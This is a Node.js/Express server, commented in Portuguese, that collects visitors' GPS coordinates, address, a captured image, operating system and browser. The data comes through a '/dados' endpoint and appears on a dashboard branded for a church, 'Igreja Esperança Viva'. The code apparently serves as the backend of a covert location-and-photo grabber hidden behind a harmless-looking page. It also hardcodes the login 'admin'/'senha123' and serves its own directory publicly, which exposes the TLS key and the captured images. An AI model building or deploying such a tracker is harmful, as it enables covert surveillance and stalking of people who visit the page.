// ========== AUTENTICAÇÃO ==========
const auth = require('basic-auth');
function autenticar(req, res, next) {
  const usuario = auth(req);
  const usuarioValido = 'admin';
  const senhaValida = 'senha123';

  if (!usuario || usuario.name !== usuarioValido || usuario.pass !== senhaValida) {
    res.set('WWW-Authenticate', 'Basic realm="Dashboard Protegido"');
    return res.status(401).send('Acesso negado – autenticação necessária.');
  }

  next();
}

// ========== DEPENDÊNCIAS ==========
const axios = require('axios');
const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));
app.use(express.json({ limit: '10mb' }));

// ========== ARMAZENAMENTO ==========
let dadosRecebidos = [];

// ========== ROTA DE CAPTURA ==========
app.post('/dados', async (req, res) => {
  const { latitude, longitude, endereco, imagem, sistema, navegador } = req.body;

  const fileName = `captura_${Date.now()}.png`;
  const base64Data = imagem.replace(/^data:image\/png;base64,/, "");
  fs.writeFileSync(path.join(__dirname, fileName), base64Data, 'base64');

  let operadora = 'Desconhecida';
  let ipPublico = 'Desconhecido';
  let ipv4 = 'Não informado';
  let ipv6 = 'Não informado';
  try {
    const ipRes = await axios.get('http://ip-api.com/json');
    operadora = ipRes.data.isp || operadora;
    ipPublico = ipRes.data.query || ipPublico;
    
    // Detectar se é IPv4 ou IPv6
    if (ipRes.data.query) {
      if (ipRes.data.query.includes(':')) {
        ipv6 = ipRes.data.query;
      } else if (ipRes.data.query.includes('.')) {
        ipv4 = ipRes.data.query;
      }
    }
  } catch (err) {
    console.error('Erro ao buscar operadora:', err.message);
  }

  const registro = {
    latitude,
    longitude,
    endereco,
    sistema,
    navegador,
    imagem: fileName,
    horario: new Date().toLocaleString(),
    operadora,
    ipPublico,
    ipv4,
    ipv6
  };

  dadosRecebidos.push(registro);
  console.log('📥 Novo registro recebido:', registro);
  res.send('Dados recebidos com sucesso!');
});

// ========== ROTA DE ACESSO VIA INDEX ==========
app.post('/acesso', async (req, res) => {
  const horario = new Date().toLocaleString();
  let operadora = 'Desconhecida';
  let ipPublico = 'Desconhecido';
  let ipv4 = 'Não informado';
  let ipv6 = 'Não informado';

  try {
    const ipRes = await axios.get('http://ip-api.com/json');
    operadora = ipRes.data.isp || operadora;
    ipPublico = ipRes.data.query || ipPublico;
    
    // Detectar se é IPv4 ou IPv6
    if (ipRes.data.query) {
      if (ipRes.data.query.includes(':')) {
        ipv6 = ipRes.data.query;
      } else if (ipRes.data.query.includes('.')) {
        ipv4 = ipRes.data.query;
      }
    }
  } catch (err) {
    console.error('Erro ao buscar operadora:', err.message);
  }

  const registro = {
    horario,
    origem: 'index.html',
    operadora,
    sistema: req.headers['user-agent'],
    ipPublico,
    ipv4,
    ipv6
  };

  dadosRecebidos.push(registro);
  console.log('👀 Acesso registrado via index.html:', registro);
  res.sendStatus(200);
});

// ========== ROTA JSON PARA FRONT ==========
app.get('/dados-json', autenticar, (req, res) => {
  res.json(dadosRecebidos);
});

// ========== DASHBOARD HTML DINÂMICO ==========
app.get('/dashboard', autenticar, (req, res) => {
  let html = `
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <title>Dashboard - Igreja Esperança Viva</title>
      <style>
        body {
          font-family: 'Segoe UI', sans-serif;
          background: #121212;
          margin: 0;
          padding: 30px;
          color: #f0f0f0;
        }
        h1 {
          color: #e0d4f7;
          font-size: 2.5em;
          margin-bottom: 10px;
        }
        .container {
          max-width: 900px;
          margin: auto;
        }
        .stats {
          background: #1e1e1e;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(255,255,255,0.05);
          margin-bottom: 30px;
        }
        .card {
          background: #1e1e1e;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(255,255,255,0.05);
          margin-bottom: 30px;
        }
        .card h2 {
          color: #e0d4f7;
          margin-top: 0;
        }
        .info {
          margin: 10px 0;
        }
        .label {
          font-weight: bold;
          color: #c0aaff;
        }
        img {
          max-width: 100%;
          border-radius: 8px;
          margin-top: 10px;
          box-shadow: 0 0 5px rgba(255,255,255,0.2);
        }
        .export-btn {
          background: #6a4c93;
          color: white;
          border: none;
          padding: 12px 20px;
          border-radius: 5px;
          cursor: pointer;
          font-size: 16px;
          margin-bottom: 20px;
        }
        .export-btn:hover {
          background: #8b5fbf;
        }
      </style>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    </head>
    <body>
      <div class="container">
        <h1>📊 Dashboard de Capturas</h1>
        <button class="export-btn" onclick="exportarPDF()">📄 Exportar para PDF</button>
        <div class="stats" id="stats"></div>
        <div id="dashboard-container"></div>
      </div>

      <script>
        let dadosGlobais = [];

        async function atualizarDashboard() {
          try {
            const res = await fetch('/dados-json');
            const dados = await res.json();
            dadosGlobais = dados;

            const total = dados.length;
            const ultimo = total > 0 ? dados[total - 1].horario : '';

            document.getElementById('stats').innerHTML = \`
              <p><span class="label">Total de acessos:</span> \${total}</p>
              \${ultimo ? \`<p><span class="label">Último acesso:</span> \${ultimo}</p>\` : ''}
            \`;

            const html = dados.slice().reverse().map((dado, index) => \`
              <div class="card">
                <h2>📥 Acesso \${index + 1}</h2>
                <div class="info"><span class="label">Horário:</span> \${dado.horario}</div>
                <div class="info"><span class="label">Endereço:</span> \${dado.endereco || 'Não informado'}</div>
                <div class="info"><span class="label">Latitude / Longitude:</span> \${dado.latitude || '-'}, \${dado.longitude || '-'}</div>
                <div class="info"><span class="label">Sistema:</span> \${dado.sistema}</div>
                <div class="info"><span class="label">Navegador:</span> \${dado.navegador || '-'}</div>
                <div class="info"><span class="label">Operadora:</span> \${dado.operadora}</div>
                <div class="info"><span class="label">IP Público:</span> \${dado.ipPublico || 'Não informado'}</div>
                <div class="info"><span class="label">IPv4:</span> \${dado.ipv4 || 'Não informado'}</div>
                <div class="info"><span class="label">IPv6:</span> \${dado.ipv6 || 'Não informado'}</div>
                \${dado.imagem ? \`<div class="info"><span class="label">Imagem capturada:</span><br><img src="/\${dado.imagem}" alt="Captura"></div>\` : ''}
              </div>
            \`).join('');

            document.getElementById('dashboard-container').innerHTML = html;
          } catch (err) {
            console.error('Erro ao carregar dados:', err);
          }
        }

        function exportarPDF() {
          const { jsPDF } = window.jspdf;
          const doc = new jsPDF();
          
          doc.setFontSize(20);
          doc.text('Dashboard de Capturas - Igreja Esperança Viva', 20, 20);
          
          doc.setFontSize(12);
          let yPosition = 40;
          
          dadosGlobais.forEach((dado, index) => {
            if (yPosition > 250) {
              doc.addPage();
              yPosition = 20;
            }
            
            doc.setFontSize(14);
            doc.text(\`Acesso \${index + 1}\`, 20, yPosition);
            yPosition += 10;
            
            doc.setFontSize(10);
            doc.text(\`Horário: \${dado.horario}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`Endereço: \${dado.endereco || 'Não informado'}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`Coordenadas: \${dado.latitude || '-'}, \${dado.longitude || '-'}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`Sistema: \${dado.sistema}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`Navegador: \${dado.navegador || '-'}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`Operadora: \${dado.operadora}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`IP Público: \${dado.ipPublico || 'Não informado'}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`IPv4: \${dado.ipv4 || 'Não informado'}\`, 20, yPosition);
            yPosition += 6;
            doc.text(\`IPv6: \${dado.ipv6 || 'Não informado'}\`, 20, yPosition);
            yPosition += 15;
          });
          
          doc.save('dashboard-capturas.pdf');
        }

        setInterval(atualizarDashboard, 10000); // Atualiza a cada 10s
        atualizarDashboard(); // Primeira chamada
      </script>
    </body>
    </html>
  `;

  res.send(html);
});

// ========== HTTPS ==========
const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

https.createServer(options, app).listen(3000, () => {
  console.log('🔒 Servidor HTTPS rodando na porta 3000');
});